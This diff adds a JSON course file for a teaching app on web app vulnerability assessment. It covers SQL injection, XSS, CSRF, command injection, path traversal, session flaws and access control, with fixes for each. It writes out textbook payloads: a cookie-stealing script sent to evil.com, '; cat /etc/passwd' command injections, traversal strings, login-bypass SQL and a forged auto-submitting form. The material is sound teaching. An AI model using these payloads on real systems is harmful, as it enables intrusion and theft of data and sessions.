@@ -1,0 +1,1611 @@
+{
+  "course_id": "webapp_vuln_assessment",
+  "title": "Web App Vulnerability Assessment",
+  "description": "Learn to systematically find, test, exploit, and document vulnerabilities in web applications. Covers SQL injection, XSS, CSRF, command injection, path traversal, session flaws, information exposure, broken access control, and CIA impact analysis — the complete methodology used by professional penetration testers.",
+  "difficulty": "ADVANCED",
+  "estimated_hours": 14,
+  "prerequisites": [
+    "xss_web_security",
+    "sql_command_injection",
+    "csrf_protection",
+    "authentication_access"
+  ],
+  "learning_outcomes": [
+    "Systematically identify vulnerabilities in a web application",
+    "Demonstrate exploitation of SQL injection (string and numeric)",
+    "Exploit reflected and stored XSS vulnerabilities",
+    "Craft and execute CSRF attacks against web forms",
+    "Exploit command injection and path traversal vulnerabilities",
+    "Identify session management flaws and information exposure",
+    "Assess CIA impact (Confidentiality, Integrity, Availability) for each vulnerability",
+    "Write professional vulnerability reports with evidence",
+    "Distinguish between vulnerability categories (injection, broken access, misconfiguration)",
+    "Apply mitigation strategies for every vulnerability found",
+    "Understand CWE identifiers and map vulnerabilities to them",
+    "Prioritise vulnerabilities by severity using CVSS-like reasoning"
+  ],
+  "neurodivergent_design": {
+    "visual_first": true,
+    "analogy_based": true,
+    "progressive_difficulty": true,
+    "colour_coded_sections": true,
+    "short_focused_exercises": true,
+    "immediate_feedback": true,
+    "multiple_explanation_styles": true,
+    "estimated_focus_time_per_exercise": "3-5 minutes"
+  },
+  "ai_tutor_config": {
+    "personality": "Encouraging, patient, uses real-world analogies. Never judges. Celebrates small wins. Thinks of vulnerability assessment like being a detective — you are looking for clues that reveal how a system can be broken!",
+    "intervention_triggers": {
+      "idle_40_seconds": "Vulnerability assessment involves a lot of thinking. Imagine you are a detective visiting a crime scene — what entry points do you see? Every form, every URL parameter, every input field is a potential clue. Want me to help you think through the attack surface?",
+      "idle_90_seconds": "Still thinking? That is great — real pen testers spend hours examining an app before finding anything. Let me simplify: start with the INPUTS. What can a user type? What can they change in the URL? What cookies exist? Each one is a door to test.",
+      "idle_180_seconds": "No worries! Let us restart with the basics. A vulnerability assessment has 4 steps: (1) Map the application, (2) Identify inputs, (3) Test each input for known attacks, (4) Document what you find. Which step shall we work on together?",
+      "first_error": "Good try! Vulnerability testing is trial and error. Even professionals try many payloads before one works. Let us refine your approach.",
+      "repeated_errors": "I can see this is tricky. Let me show you the exact payload that works, then we will break down WHY it works step by step.",
+      "after_success": "Brilliant! You just found and exploited a real vulnerability. This is exactly what professional security testers do every day!"
+    },
+    "encouragement_phrases": [
+      "Every vulnerability you find makes the web a safer place!",
+      "Professional pen testers started exactly where you are now!",
+      "You are learning to think like an attacker — the best way to build defences!",
+      "SQL injection is still the #1 database attack. You can now spot it!",
+      "XSS is found in over 60% of web apps. Your skills are in demand!",
+      "CSRF is sneaky but you understand it now. That is a real achievement!",
+      "Command injection can give full server access. You know how to prevent it!",
+      "Path traversal is subtle but devastating. Great work identifying it!",
+      "CIA analysis is what separates a report from a professional report!",
+      "Every exploit you understand is a defence you can build!"
+    ],
+    "explanation_styles": {
+      "analogy": "Vulnerability assessment is like being a building inspector. You check every door, window, lock, and alarm. You try to open things that should be locked. You document everything you find and rate how dangerous each issue is.",
+      "visual": "Draw the flow: [Map App] -> [Find Inputs] -> [Test Payloads] -> [Confirm Exploit] -> [Assess Impact] -> [Document & Report]. Each step feeds the next.",
+      "step_by_step": "Step 1: Browse the application normally. Step 2: List every form, parameter, and cookie. Step 3: For each input, try SQL injection, XSS, command injection payloads. Step 4: Check if the payload executed. Step 5: Document the evidence. Step 6: Rate the severity.",
+      "code_trace": "The exploit works because: Line 1 takes user input. Line 2 puts it directly into a query/command/HTML without sanitisation. Line 3 executes the query/command/renders HTML. The fix: sanitise, parameterise, or encode BEFORE using the input.",
+      "comparison": "WITHOUT assessment: vulnerabilities sit in production, waiting for an attacker. WITH assessment: you find them first, fix them, and protect your users. Offence informs defence."
+    }
+  },
+  "lessons": [
+    {
+      "lesson_id": "webapp_vuln_assessment_lesson_1",
+      "title": "Web Application Vulnerability Assessment: Find, Exploit, Document",
+      "theory": {
+        "introduction": "Every web application is a target. Banks, hospitals, social media, e-commerce — they all run on code that processes user input, queries databases, and renders web pages. When that code does not properly handle untrusted input, vulnerabilities emerge. A vulnerability assessment is the systematic process of finding, testing, and documenting these weaknesses before an attacker does. This course teaches you the complete methodology: mapping the application, identifying attack surfaces, testing for specific vulnerability types (SQL injection, XSS, CSRF, command injection, path traversal, session flaws, information exposure, broken access control), confirming exploitation with evidence, analysing the impact on Confidentiality, Integrity, and Availability (CIA), and writing professional reports. You will learn to think like an attacker so you can build better defences. Every vulnerability has a CWE identifier (Common Weakness Enumeration) that categorises it, and every exploit has a real-world impact that must be measured. By the end of this course, you will be able to perform a complete vulnerability assessment on any Java-based web application.",
+        "why_important": "In 2023, the average cost of a data breach was $4.45 million. Most breaches exploit known vulnerability types — SQL injection, XSS, broken access control — that could have been found with a proper assessment. Companies hire penetration testers specifically to find these issues before criminals do. The OWASP Top 10 lists the most critical web application security risks, and every one of them can be found through systematic assessment. Whether you are a developer who wants to write secure code, a tester who needs to verify security, or an aspiring security professional, these skills are essential and in extremely high demand.",
+        "key_concepts": [
+          {
+            "concept": "The Assessment Methodology",
+            "explanation": "A vulnerability assessment follows a structured process: (1) Reconnaissance — understand what the application does, its features, roles, and pages. (2) Attack Surface Mapping — identify every input point: forms, URL parameters, cookies, headers, file uploads. (3) Vulnerability Testing — for each input, test for specific vulnerability types using known payloads. (4) Exploitation — confirm the vulnerability by demonstrating real impact. (5) Impact Analysis — assess the effect on Confidentiality, Integrity, and Availability. (6) Documentation — write clear, reproducible evidence with screenshots and payloads. (7) Remediation — recommend specific fixes for each vulnerability.",
+            "example": "// ASSESSMENT CHECKLIST:\n// 1. RECON: Browse app, list all pages and features\n//    - Login page, profile page, transfer funds, admin panel\n//    - Two roles: admin and normal user\n//\n// 2. ATTACK SURFACE: List inputs\n//    - Login form: username, password fields\n//    - Search box: query parameter\n//    - URL: /profile?id=123\n//    - Cookie: session=abc123\n//\n// 3. TEST EACH INPUT:\n//    - Login form -> SQL injection test\n//    - Search box -> XSS test, SQL injection test\n//    - URL id param -> IDOR test\n//    - Cookie -> session fixation test\n//\n// 4. CONFIRM: Show the vulnerability working\n// 5. IMPACT: What damage could an attacker do?\n// 6. DOCUMENT: Evidence for report\n// 7. FIX: Recommend specific code changes",
+            "ai_hint": "Think of it like a health check-up for software. The doctor (you) examines every organ (input), runs specific tests (payloads), diagnoses problems (vulnerabilities), and prescribes treatment (fixes)."
+          },
+          {
+            "concept": "SQL Injection (CWE-89)",
+            "explanation": "SQL injection occurs when user input is inserted directly into a SQL query without sanitisation, allowing an attacker to modify the query's logic. String injection uses quotes to break out of string context: ' OR '1'='1 makes a WHERE clause always true. Numeric injection does not need quotes: 1 OR 1=1. To test: enter a single quote (') in every input field — if you get a database error, SQL injection is likely possible. The fix is ALWAYS parameterised queries (prepared statements), never string concatenation.",
+            "example": "// VULNERABLE CODE:\nString query = \"SELECT * FROM users WHERE username='\" \n    + userInput + \"' AND password='\" + passInput + \"'\";\n\n// EXPLOIT: Enter username: admin' OR '1'='1' --\n// Query becomes:\n// SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password=''\n// The -- comments out the password check!\n// Result: Logs in as admin without knowing the password\n\n// DETECTION: Enter a single quote ' in username field\n// If you see: SQL error, unmatched quote, or database error -> LIKELY VULNERABLE\n\n// FIX:\nPreparedStatement ps = conn.prepareStatement(\n    \"SELECT * FROM users WHERE username=? AND password=?\");\nps.setString(1, userInput);\nps.setString(2, passInput);",
+            "ai_hint": "SQL injection is like adding extra instructions to a shopping list. The cashier (database) follows ALL instructions on the list, including the ones the attacker added."
+          },
+          {
+            "concept": "Cross-Site Scripting / XSS (CWE-79)",
+            "explanation": "XSS occurs when user input is rendered in a web page without encoding, allowing an attacker to inject JavaScript that executes in other users' browsers. Reflected XSS: the payload is in the URL and reflected back immediately (e.g., search results). Stored XSS: the payload is saved in the database and displayed to every user who views the page (e.g., forum posts, profile fields). To test: enter <script>alert('XSS')</script> in every input field and check if an alert box appears. The fix is OUTPUT ENCODING — convert < to &lt; before rendering.",
+            "example": "// VULNERABLE CODE:\nout.println(\"<p>Welcome, \" + username + \"</p>\");\n\n// EXPLOIT (Reflected): \n// URL: /welcome?name=<script>alert('XSS')</script>\n// The browser executes the script!\n\n// EXPLOIT (Stored):\n// Set profile name to: <script>document.location='http://evil.com/steal?c='+document.cookie</script>\n// Every user who views this profile has their cookies stolen!\n\n// DETECTION: Enter <script>alert(1)</script> in fields\n// Also try: <img src=x onerror=alert(1)>\n// If an alert appears -> VULNERABLE\n\n// FIX:\nimport org.owasp.encoder.Encode;\nout.println(\"<p>Welcome, \" + Encode.forHtml(username) + \"</p>\");",
+            "ai_hint": "XSS is like someone slipping a note into a book at the library. Every person who reads that page follows the note's instructions, thinking they came from the original author."
+          },
+          {
+            "concept": "Cross-Site Request Forgery / CSRF (CWE-352)",
+            "explanation": "CSRF tricks a logged-in user's browser into making a request they did not intend. If a user is logged into their bank and visits a malicious page, that page can contain a hidden form that transfers money from the user's account. The browser automatically includes the session cookie, so the bank thinks it is a legitimate request. To test: check if sensitive forms include a CSRF token. If a form works without a token, it is vulnerable. The fix is anti-CSRF tokens — unique random values in each form that the server validates.",
+            "example": "// VULNERABLE: Transfer form has no CSRF token\n// <form action='/transfer' method='POST'>\n//   <input name='to' value='attacker'>\n//   <input name='amount' value='10000'>\n//   <input type='submit'>\n// </form>\n\n// EXPLOIT: Attacker hosts a page with hidden auto-submitting form:\n// <html><body onload='document.forms[0].submit()'>\n// <form action='http://bank.com/transfer' method='POST'>\n//   <input name='to' value='attacker'>\n//   <input name='amount' value='10000'>\n// </form></body></html>\n// When victim visits this page while logged into bank -> money transferred!\n\n// DETECTION:\n// 1. View page source of sensitive forms\n// 2. Check for hidden csrf_token field\n// 3. Try submitting form without the token\n// 4. If it works -> VULNERABLE\n\n// FIX: Include and validate CSRF token in every state-changing form",
+            "ai_hint": "CSRF is like someone forging your signature on a cheque. The bank (server) sees your signature (cookie) and processes it, not knowing you did not write it."
+          },
+          {
+            "concept": "Command Injection (CWE-78)",
+            "explanation": "Command injection occurs when user input is passed to a system command (like Runtime.exec() or ProcessBuilder) without sanitisation. The attacker appends extra commands using shell metacharacters like ; | & || && or backticks. For example, if an app runs ping <user_input>, an attacker can enter 127.0.0.1; cat /etc/passwd to execute an additional command. To test: append ; whoami or | ls to inputs that seem to be used in system commands. The fix is input validation (whitelist allowed characters) and avoiding system commands entirely when possible.",
+            "example": "// VULNERABLE CODE:\nString cmd = \"ping -c 1 \" + userInput;\nProcess p = Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",cmd});\n\n// EXPLOIT: Enter: 127.0.0.1; cat /etc/passwd\n// Executed: ping -c 1 127.0.0.1; cat /etc/passwd\n// Attacker sees the password file!\n\n// MORE EXPLOITS:\n// Input: 127.0.0.1 && whoami       -> shows current user\n// Input: 127.0.0.1 | ls -la        -> lists directory\n// Input: `whoami`                    -> command substitution\n\n// DETECTION: Try ; whoami appended to any input\n// If you see a username in response -> VULNERABLE\n\n// FIX: Whitelist validation\nif (!userInput.matches(\"^[0-9.]+$\")) {\n    throw new SecurityException(\"Invalid input\");\n}",
+            "ai_hint": "Command injection is like adding extra stops to a delivery driver's route. They follow ALL the directions, including the ones the attacker added."
+          },
+          {
+            "concept": "Path Traversal (CWE-22)",
+            "explanation": "Path traversal occurs when user input controls a file path, and the attacker uses ../ sequences to navigate outside the intended directory. If an app serves files like /files?name=report.pdf, an attacker can try /files?name=../../../etc/passwd to read sensitive system files. To test: replace filenames with ../../etc/passwd or ..\\..\\windows\\system32\\config\\sam. The fix is canonicalise the path and verify it stays within the allowed directory.",
+            "example": "// VULNERABLE CODE:\nString filename = request.getParameter(\"file\");\nString path = \"/var/www/uploads/\" + filename;\nFile f = new File(path);\n// Serve file contents...\n\n// EXPLOIT: ?file=../../../etc/passwd\n// Resolved path: /var/www/uploads/../../../etc/passwd -> /etc/passwd\n// Attacker reads the system password file!\n\n// DETECTION:\n// Try: ../../etc/passwd\n// Try: ..%2f..%2f..%2fetc%2fpasswd  (URL encoded)\n// Try: ....//....//etc/passwd  (double encoding)\n// If you see file contents -> VULNERABLE\n\n// FIX:\nFile baseDir = new File(\"/var/www/uploads\");\nFile requested = new File(baseDir, filename).getCanonicalFile();\nif (!requested.getPath().startsWith(baseDir.getCanonicalPath())) {\n    throw new SecurityException(\"Path traversal detected\");\n}",
+            "ai_hint": "Path traversal is like asking a librarian for a book but giving directions that lead outside the library into the staff-only records room."
+          },
+          {
+            "concept": "Session Management Flaws",
+            "explanation": "Session flaws allow attackers to hijack, fixate, or predict user sessions. Common issues: predictable session IDs (session_1, session_2...), session IDs in URLs (visible in browser history and logs), sessions that do not expire, sessions not destroyed on logout, same session ID before and after login (fixation), and missing HttpOnly/Secure cookie flags. To test: examine session cookies for randomness, check if IDs change after login, try reusing a session after logout, check cookie attributes in browser dev tools.",
+            "example": "// DETECTION CHECKLIST:\n//\n// 1. Cookie randomness:\n//    Open DevTools -> Application -> Cookies\n//    Is the session ID long and random? Or short/predictable?\n//\n// 2. Session fixation:\n//    Note session ID BEFORE login\n//    Log in\n//    Check session ID AFTER login\n//    Same ID? -> FIXATION VULNERABILITY\n//\n// 3. Session expiry:\n//    Log in, wait 30 minutes, try accessing a page\n//    Still works? -> NO EXPIRY\n//\n// 4. Logout invalidation:\n//    Log in, copy session cookie, log out\n//    Paste cookie back -> still works? -> SESSION NOT DESTROYED\n//\n// 5. Cookie flags:\n//    Is HttpOnly set? (prevents JS access)\n//    Is Secure set? (HTTPS only)\n//    Is SameSite set? (CSRF protection)",
+            "ai_hint": "Session testing is like checking if hotel keycards work after checkout. If your old keycard still opens the room, the hotel has a security problem!"
+          },
+          {
+            "concept": "Information Exposure (CWE-200)",
+            "explanation": "Information exposure means the application reveals data that should be kept hidden: detailed error messages showing database structure or stack traces, directory listings exposing file structures, version numbers of software (Apache, Tomcat, Java version), debug information left in production, source code comments with credentials, and sensitive data in HTML hidden fields or JavaScript. To test: cause errors (enter invalid data, access nonexistent pages) and examine the error messages. Check page source for comments. Try common paths like /admin, /debug, /status.",
+            "example": "// INFORMATION EXPOSURE EXAMPLES:\n\n// 1. Verbose error message:\n// Input: ' in login field\n// Response: \"SQL syntax error near ''' at line 1 in query:\n//   SELECT * FROM users WHERE username=''' AND password='test'\"\n// EXPOSED: Database type, table name, column names, query structure!\n\n// 2. Directory listing (CWE-548):\n// Browse to /uploads/ -> see list of all uploaded files\n// EXPOSED: File names, structure, potentially sensitive files\n\n// 3. Stack trace:\n// Response: java.sql.SQLException at DBHelper.java:42\n// EXPOSED: Programming language, file names, line numbers\n\n// 4. HTML comments:\n// View source: <!-- TODO: Remove before production -->\n// <!-- Admin password: admin123 -->\n// EXPOSED: Credentials, internal notes\n\n// FIX: Custom error pages, disable directory listing,\n// remove comments, never show stack traces to users",
+            "ai_hint": "Information exposure is like leaving your house plans on the front lawn. Burglars can study them to find the weakest entry point."
+          },
+          {
+            "concept": "Broken Access Control (CWE-284)",
+            "explanation": "Broken access control means users can act outside their intended permissions. This includes: accessing other users' data by changing an ID in the URL (IDOR), accessing admin pages without admin role, performing actions without authorisation checks, and horizontal privilege escalation (user A accesses user B's data) or vertical escalation (regular user accesses admin functions). To test: log in as a normal user and try accessing admin URLs directly. Change IDs in URLs to other users' IDs. Check if API endpoints validate permissions.",
+            "example": "// BROKEN ACCESS CONTROL EXAMPLES:\n\n// 1. IDOR (Insecure Direct Object Reference):\n// Logged in as user1, URL shows: /profile?id=1\n// Change to: /profile?id=2 -> see user2's data!\n\n// 2. Missing function-level access control:\n// Normal user URL: /dashboard\n// Try: /admin/dashboard -> admin panel loads!\n// No role check on the server side.\n\n// 3. Parameter manipulation:\n// POST /updateProfile\n// Body: userId=1&role=user\n// Change to: userId=1&role=admin -> privilege escalation!\n\n// 4. Forced browsing:\n// URL: /reports/2024/financial.pdf\n// Try: /reports/2023/financial.pdf -> old reports accessible!\n\n// DETECTION: As a normal user, try every admin URL.\n// Change every ID parameter. Check every hidden field.\n\n// FIX: Server-side authorisation on EVERY endpoint.",
+            "ai_hint": "Broken access control is like an office where anyone can walk into the CEO's office because the door is unlocked. The nameplate says 'CEO Only' but nobody actually checks."
+          },
+          {
+            "concept": "CIA Impact Analysis",
+            "explanation": "Every vulnerability must be assessed for its impact on three security properties: Confidentiality (can the attacker READ sensitive data?), Integrity (can the attacker MODIFY data?), and Availability (can the attacker DISRUPT the service?). SQL injection impacts all three: read data (C), modify data (I), drop tables (A). XSS primarily impacts C (steal cookies) and I (deface pages). CSRF impacts I (modify data on victim's behalf). Rate each as HIGH, MEDIUM, or LOW to prioritise fixes.",
+            "example": "// CIA IMPACT ASSESSMENT EXAMPLES:\n\n// SQL Injection:\n//   Confidentiality: HIGH - Can read all database records\n//   Integrity:       HIGH - Can modify or delete records\n//   Availability:    HIGH - Can DROP tables or shutdown DB\n\n// Stored XSS:\n//   Confidentiality: HIGH - Can steal session cookies\n//   Integrity:       MEDIUM - Can deface pages for all users\n//   Availability:    LOW - Does not directly affect server\n\n// CSRF (money transfer):\n//   Confidentiality: LOW - Does not read data\n//   Integrity:       HIGH - Modifies account balances\n//   Availability:    LOW - Service still running\n\n// Path Traversal:\n//   Confidentiality: HIGH - Can read sensitive files\n//   Integrity:       LOW (read-only) to HIGH (if write possible)\n//   Availability:    LOW - Does not crash service\n\n// Information Exposure (error messages):\n//   Confidentiality: MEDIUM - Reveals internal structure\n//   Integrity:       LOW - No modification\n//   Availability:    LOW - No disruption",
+            "ai_hint": "CIA analysis is like assessing a break-in: Can the thief SEE your private documents (Confidentiality)? Can they CHANGE your records (Integrity)? Can they LOCK you out of your own house (Availability)?"
+          },
+          {
+            "concept": "CWE Mapping and Classification",
+            "explanation": "Every vulnerability maps to a CWE (Common Weakness Enumeration) identifier. This provides a standard language for categorising weaknesses. Key CWEs for web assessment: CWE-89 (SQL Injection), CWE-79 (XSS), CWE-352 (CSRF), CWE-78 (OS Command Injection), CWE-22 (Path Traversal), CWE-200 (Information Exposure), CWE-548 (Directory Listing), CWE-287 (Improper Authentication), CWE-862 (Missing Authorisation), CWE-434 (Unrestricted File Upload), CWE-502 (Deserialisation of Untrusted Data), CWE-20 (Improper Input Validation). Using CWEs in reports shows professionalism and enables consistent tracking across organisations.",
+            "example": "// CWE CLASSIFICATION QUICK REFERENCE:\n\n// INJECTION FAMILY:\n//   CWE-89  -> SQL Injection\n//   CWE-78  -> OS Command Injection\n//   CWE-77  -> Command Injection (generic)\n//   CWE-94  -> Code Injection\n//   CWE-79  -> XSS (injection into HTML)\n\n// ACCESS CONTROL FAMILY:\n//   CWE-287 -> Improper Authentication\n//   CWE-862 -> Missing Authorisation\n//   CWE-306 -> Missing Auth for Critical Function\n//   CWE-269 -> Improper Privilege Management\n\n// DATA EXPOSURE FAMILY:\n//   CWE-200 -> Sensitive Information Exposure\n//   CWE-548 -> Directory Listing\n//   CWE-209 -> Error Message Information Leak\n\n// FILE/PATH FAMILY:\n//   CWE-22  -> Path Traversal\n//   CWE-434 -> Unrestricted File Upload\n\n// SESSION FAMILY:\n//   CWE-384 -> Session Fixation\n//   CWE-613 -> Insufficient Session Expiration",
+            "ai_hint": "CWEs are like medical diagnosis codes. Instead of saying 'the patient is sick', a doctor says 'ICD-10: J06.9 (upper respiratory infection)'. CWEs give vulnerabilities their precise diagnosis."
+          },
+          {
+            "concept": "Vulnerability Report Writing",
+            "explanation": "A professional vulnerability report contains for each finding: (1) Title — clear name (e.g., 'SQL Injection in Login Form'). (2) CWE ID — standardised identifier. (3) Description — what the vulnerability is. (4) Reproduction Steps — exact inputs, URLs, and actions to reproduce. (5) Evidence — screenshots, payloads used, and server responses. (6) Impact — CIA analysis and severity rating. (7) Remediation — specific code fix recommendation. Good reports are reproducible — someone else should be able to follow your steps and see the same result.",
+            "example": "// VULNERABILITY REPORT TEMPLATE:\n//\n// VULN #1: SQL Injection in Login Form\n// CWE: CWE-89\n// Severity: CRITICAL\n// Location: /login POST endpoint, 'username' parameter\n//\n// DESCRIPTION:\n// The login form concatenates user input directly into a SQL query.\n//\n// REPRODUCTION:\n// 1. Navigate to /login\n// 2. Enter username: admin' OR '1'='1' --\n// 3. Enter password: anything\n// 4. Click Login\n// 5. Result: Logged in as admin without valid password\n//\n// EVIDENCE:\n// Payload: admin' OR '1'='1' --\n// Response: 'Welcome, admin' dashboard page\n//\n// CIA IMPACT:\n// Confidentiality: HIGH - Full database access\n// Integrity: HIGH - Can modify any record\n// Availability: HIGH - Can drop tables\n//\n// REMEDIATION:\n// Replace string concatenation with PreparedStatement",
+            "ai_hint": "A good vulnerability report is like a recipe — anyone should be able to follow it and get the same result. Steps, ingredients (payloads), and expected outcome."
+          },
+          {
+            "concept": "Severity Rating and Prioritisation",
+            "explanation": "Not all vulnerabilities are equally dangerous. Rate severity as CRITICAL, HIGH, MEDIUM, LOW, or INFORMATIONAL based on: exploitability (how easy is it to exploit?), impact (what damage can be done?), affected users (one user or all users?), and prerequisites (does the attacker need authentication?). SQL injection with full database access is CRITICAL. Information exposure via verbose errors is MEDIUM. Missing HTTPS on a static page is LOW. Prioritise fixes: CRITICAL first, then HIGH, then work down.",
+            "example": "// SEVERITY RATING EXAMPLES:\n//\n// CRITICAL:\n//   SQL Injection -> Full database compromise\n//   Command Injection -> Server takeover\n//   Authentication Bypass -> Complete access\n//\n// HIGH:\n//   Stored XSS -> Cookie theft, user impersonation\n//   CSRF on fund transfer -> Financial loss\n//   Path Traversal to /etc/passwd -> System info leak\n//\n// MEDIUM:\n//   Reflected XSS -> Requires victim to click link\n//   Information exposure -> Helps plan further attacks\n//   Missing session expiry -> Extended attack window\n//\n// LOW:\n//   Missing Secure flag on non-sensitive cookie\n//   Server version disclosed in headers\n//   Autocomplete not disabled on login form\n//\n// INFORMATIONAL:\n//   Best practice not followed but no direct risk",
+            "ai_hint": "Think of severity like a fire alarm system: CRITICAL = building on fire (evacuate now). HIGH = smoke detected (investigate immediately). MEDIUM = fire extinguisher expired (fix this week). LOW = exit sign bulb dim (add to maintenance list)."
+          }
+        ]
+      },
+      "complete_examples": [
+        {
+          "title": "Example 1: SQL Injection Detection and Exploitation",
+          "description": "Finding and exploiting SQL injection in a login form",
+          "difficulty": "intermediate",
+          "code": "import java.sql.*;\n\npublic class SQLiDemo {\n    // VULNERABLE login method\n    static String vulnerableLogin(String user, String pass) {\n        String query = \"SELECT * FROM users WHERE username='\" + user\n            + \"' AND password='\" + pass + \"'\";\n        System.out.println(\"Query: \" + query);\n        // Simulate: would execute against database\n        if (query.contains(\"OR '1'='1'\") || query.contains(\"OR 1=1\")) {\n            return \"LOGIN SUCCESS (SQL injection!): Admin access granted\";\n        }\n        if (user.equals(\"admin\") && pass.equals(\"adminPassword\")) {\n            return \"LOGIN SUCCESS: Welcome admin\";\n        }\n        return \"LOGIN FAILED: Invalid credentials\";\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== SQL INJECTION ASSESSMENT ===\");\n        System.out.println();\n        System.out.println(\"--- Normal Login ---\");\n        System.out.println(vulnerableLogin(\"admin\", \"adminPassword\"));\n        System.out.println();\n        System.out.println(\"--- Detection: Single Quote Test ---\");\n        System.out.println(vulnerableLogin(\"admin'\", \"test\"));\n        System.out.println(\"(If this causes an SQL error, injection is likely)\\n\");\n        System.out.println(\"--- Exploit: Authentication Bypass ---\");\n        System.out.println(vulnerableLogin(\"admin' OR '1'='1' --\", \"anything\"));\n        System.out.println();\n        System.out.println(\"--- Exploit: Union-based data extraction ---\");\n        System.out.println(vulnerableLogin(\"' UNION SELECT username,password FROM users --\", \"\"));\n    }\n}",
+          "output": "=== SQL INJECTION ASSESSMENT ===\n\n--- Normal Login ---\nQuery: SELECT * FROM users WHERE username='admin' AND password='adminPassword'\nLOGIN SUCCESS: Welcome admin\n\n--- Detection: Single Quote Test ---\nQuery: SELECT * FROM users WHERE username='admin'' AND password='test'\nLOGIN FAILED: Invalid credentials\n(If this causes an SQL error, injection is likely)\n\n--- Exploit: Authentication Bypass ---\nQuery: SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'\nLOGIN SUCCESS (SQL injection!): Admin access granted\n\n--- Exploit: Union-based data extraction ---\nQuery: SELECT * FROM users WHERE username='' UNION SELECT username,password FROM users --' AND password=''\nLOGIN FAILED: Invalid credentials",
+          "ai_explanation": "Step 1: Normal login works as expected. Step 2: Single quote test — in a real app, this would cause an SQL syntax error, confirming injection. Step 3: The OR '1'='1' makes the WHERE clause always true, bypassing authentication. The -- comments out the rest of the query. This is the classic SQL injection authentication bypass.",
+          "ai_challenge": "What is the difference between string SQL injection and numeric SQL injection? When would you use 1 OR 1=1 instead of ' OR '1'='1?"
+        },
+        {
+          "title": "Example 2: XSS Detection and Payload Testing",
+          "description": "Testing for reflected and stored XSS vulnerabilities",
+          "difficulty": "intermediate",
+          "code": "public class XSSDetection {\n    // Simulate a vulnerable page that reflects input\n    static String renderPage(String userInput) {\n        return \"<html><body><p>Search results for: \" + userInput + \"</p></body></html>\";\n    }\n    \n    // Secure version with encoding\n    static String renderPageSecure(String userInput) {\n        String encoded = userInput\n            .replace(\"&\", \"&amp;\")\n            .replace(\"<\", \"&lt;\")\n            .replace(\">\", \"&gt;\")\n            .replace(\"\\\"\", \"&quot;\")\n            .replace(\"'\", \"&#x27;\");\n        return \"<html><body><p>Search results for: \" + encoded + \"</p></body></html>\";\n    }\n    \n    static boolean detectsXSS(String html) {\n        return html.contains(\"<script\") || html.contains(\"onerror=\") || html.contains(\"onload=\");\n    }\n    \n    public static void main(String[] args) {\n        String[] payloads = {\n            \"<script>alert('XSS')</script>\",\n            \"<img src=x onerror=alert(1)>\",\n            \"<svg onload=alert(1)>\",\n            \"normal search term\",\n            \"<b>bold text</b>\"\n        };\n        \n        System.out.println(\"=== XSS DETECTION RESULTS ===\");\n        for (String p : payloads) {\n            String html = renderPage(p);\n            String htmlSafe = renderPageSecure(p);\n            boolean vuln = detectsXSS(html);\n            boolean safe = detectsXSS(htmlSafe);\n            System.out.println(\"\\nPayload: \" + p);\n            System.out.println(\"  Vulnerable page: \" + (vuln ? \"XSS DETECTED!\" : \"Clean\"));\n            System.out.println(\"  Secure page:     \" + (safe ? \"XSS DETECTED!\" : \"Clean\"));\n        }\n    }\n}",
+          "output": "=== XSS DETECTION RESULTS ===\n\nPayload: <script>alert('XSS')</script>\n  Vulnerable page: XSS DETECTED!\n  Secure page:     Clean\n\nPayload: <img src=x onerror=alert(1)>\n  Vulnerable page: XSS DETECTED!\n  Secure page:     Clean\n\nPayload: <svg onload=alert(1)>\n  Vulnerable page: XSS DETECTED!\n  Secure page:     Clean\n\nPayload: normal search term\n  Vulnerable page: Clean\n  Secure page:     Clean\n\nPayload: <b>bold text</b>\n  Vulnerable page: Clean\n  Secure page:     Clean",
+          "ai_explanation": "Multiple XSS payloads are tested. The <script> tag is the classic test. <img onerror> and <svg onload> are alternatives that bypass basic script-tag filters. The secure version encodes all special characters, preventing the browser from interpreting them as HTML. Always test multiple payloads — a WAF might block <script> but allow <img onerror>.",
+          "ai_challenge": "Why might <script>alert(1)</script> be blocked but <img src=x onerror=alert(1)> still work? Think about what a basic filter might check for."
+        },
+        {
+          "title": "Example 3: CSRF Vulnerability Check",
+          "description": "Verifying if forms have CSRF protection",
+          "difficulty": "intermediate",
+          "code": "import java.util.regex.*;\n\npublic class CSRFCheck {\n    static String checkForm(String formName, String formHtml) {\n        boolean hasToken = formHtml.contains(\"csrf_token\") || \n                          formHtml.contains(\"_csrf\") ||\n                          formHtml.contains(\"authenticity_token\");\n        boolean isPostForm = formHtml.contains(\"method=\\\"POST\\\"\") || \n                            formHtml.contains(\"method='POST'\");\n        boolean isStateChanging = formHtml.contains(\"transfer\") || \n                                  formHtml.contains(\"delete\") ||\n                                  formHtml.contains(\"update\") ||\n                                  formHtml.contains(\"password\");\n        \n        StringBuilder result = new StringBuilder();\n        result.append(\"Form: \" + formName + \"\\n\");\n        result.append(\"  POST method: \" + isPostForm + \"\\n\");\n        result.append(\"  State-changing: \" + isStateChanging + \"\\n\");\n        result.append(\"  CSRF token present: \" + hasToken + \"\\n\");\n        \n        if (isStateChanging && !hasToken) {\n            result.append(\"  VERDICT: VULNERABLE TO CSRF!\\n\");\n        } else if (isStateChanging && hasToken) {\n            result.append(\"  VERDICT: Protected (token found)\\n\");\n        } else {\n            result.append(\"  VERDICT: Low risk (not state-changing)\\n\");\n        }\n        return result.toString();\n    }\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF ASSESSMENT ===\");\n        System.out.println(checkForm(\"Transfer Funds\",\n            \"<form action='/transfer' method=\\\"POST\\\"><input name='to'><input name='amount'><button>transfer</button></form>\"));\n        System.out.println(checkForm(\"Change Password\",\n            \"<form action='/password' method=\\\"POST\\\"><input name='csrf_token' type='hidden' value='abc123'><input name='password'><button>update</button></form>\"));\n        System.out.println(checkForm(\"Search\",\n            \"<form action='/search' method=\\\"GET\\\"><input name='q'><button>Search</button></form>\"));\n    }\n}",
+          "output": "=== CSRF ASSESSMENT ===\nForm: Transfer Funds\n  POST method: true\n  State-changing: true\n  CSRF token present: false\n  VERDICT: VULNERABLE TO CSRF!\n\nForm: Change Password\n  POST method: true\n  State-changing: true\n  CSRF token present: true\n  VERDICT: Protected (token found)\n\nForm: Search\n  POST method: false\n  State-changing: false\n  CSRF token present: false\n  VERDICT: Low risk (not state-changing)",
